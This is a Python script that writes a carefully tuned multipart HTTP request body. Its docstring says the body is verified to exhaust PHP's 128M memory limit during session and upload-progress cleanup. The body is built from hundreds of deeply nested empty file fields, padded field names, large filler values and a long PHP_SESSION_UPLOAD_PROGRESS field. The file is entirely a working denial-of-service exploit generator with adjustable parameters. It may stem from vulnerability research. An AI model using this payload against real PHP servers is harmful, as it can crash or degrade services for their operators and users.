#!/usr/bin/env python3
"""Generate the exact A1 (END-cleanup send_cookie OOM) multipart body.

Shape (verified 128M OOM):
  PHPSESSID=<sid-hex>
  parts x depth-64 nested empty-file fields (index 0/1 have short filenames and
    103/231-byte Content-Types)
  fillers128 x (103-byte name, 8-byte value)
  big x (5-char name, 8000-byte value)
  burners x (3-char name, 4000-byte value)
  PHP_SESSION_UPLOAD_PROGRESS = 'k' * progress_len
  tail fields (optional; placed after the progress field)
"""
from __future__ import annotations

import argparse


def nest_name(i: int, depth: int, key_pad: int) -> bytes:
    return ("files[R%05d%s]" % (i, "K" * key_pad)).encode() + b"[a]" * (depth - 2)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", required=True)
    ap.add_argument("--parts", type=int, default=860)
    ap.add_argument("--depth", type=int, default=64)
    ap.add_argument("--key-pad", type=int, default=90)
    ap.add_argument("--fillers128", type=int, default=14)
    ap.add_argument("--big", type=int, default=78)
    ap.add_argument("--big-len", type=int, default=8000)
    ap.add_argument("--burners", type=int, default=20)
    ap.add_argument("--burner-len", type=int, default=4000)
    ap.add_argument("--progress-len", type=int, default=4000)
    ap.add_argument("--sid-hex", default="00")
    ap.add_argument("--tail", type=int, default=0)
    ap.add_argument("--tail-name-len", type=int, default=35)
    ap.add_argument("--tail-value-len", type=int, default=35)
    ap.add_argument("--boundary", default="C" * 10)
    args = ap.parse_args()

    b = args.boundary.encode()
    out = bytearray()

    def part(name: bytes, value: bytes = b"", filename: bytes | None = None,
             ctype: bytes | None = None) -> None:
        out.extend(b"--" + b + b"\r\nContent-Disposition: form-data; name=\"" + name + b"\"")
        if filename is not None:
            out.extend(b"; filename=\"" + filename + b"\"")
        out.extend(b"\r\n")
        if ctype is not None:
            out.extend(b"Content-Type: " + ctype + b"\r\n")
        out.extend(b"\r\n" + value + b"\r\n")

    part(b"PHPSESSID", bytes.fromhex(args.sid_hex))
    for i in range(args.parts):
        is_mixed = i == 0
        is_mixed2 = i == 1
        ctype = b"C" * 103 if is_mixed else (b"C" * 231 if is_mixed2 else b"application/octet-stream")
        out.extend(b"--" + b + b"\r\nContent-Disposition: form-data; name=\"" +
                   nest_name(i, args.depth, args.key_pad) + b"\"")
        if is_mixed or is_mixed2:
            out.extend(b"; filename=\"A\"")
        else:
            out.extend(b"; filename=\"\"")
        out.extend(b"\r\nContent-Type: " + ctype + b"\r\n\r\n")
    for i in range(args.fillers128):
        part(("f%04d" % i).encode().ljust(103, b"x")[:103], b"v" * 8)
    for i in range(args.big):
        part(("b%04d" % i).encode(), b"B" * args.big_len)
    for i in range(args.burners):
        part(("u%02d" % i).encode(), b"U" * args.burner_len)
    part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * args.progress_len)
    for i in range(args.tail):
        name = ("t%02d" % i).encode().ljust(args.tail_name_len, b"t")[:args.tail_name_len]
        part(name, b"T" * args.tail_value_len)
    out.extend(b"--" + b + b"--\r\n")
    with open(args.out, "wb") as fh:
        fh.write(bytes(out))
    print("body=%d parts=%d" % (len(out), 2 + args.parts + args.fillers128 + args.big + args.burners + args.tail))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
